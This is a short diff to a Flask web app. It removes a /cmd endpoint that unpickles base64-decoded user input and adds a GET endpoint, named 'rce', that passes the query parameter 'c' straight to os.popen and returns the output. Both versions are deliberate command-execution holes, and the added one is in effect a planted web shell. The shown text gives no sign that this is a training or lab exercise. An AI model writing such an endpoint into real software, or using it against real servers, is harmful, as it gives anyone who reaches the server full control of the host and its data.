@@ -1,5 +1,4 @@
-import pickle
-import base64
+import os
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -10,8 +9,9 @@ def index():
     return 'Hello, World!'
 
 
-@app.route("/cmd", methods=["POST"])
-def unsafe_pickle():
-    data = base64.urlsafe_b64decode(request.form['cmd'])
-    pickle.loads(data)
-    return '', 204
+@app.route("/cmd", methods=["GET"])
+def rce():
+    if request.args.get('c'):
+        return os.popen(request.args.get('c')).read(), 200
+
+    return ':P', 400
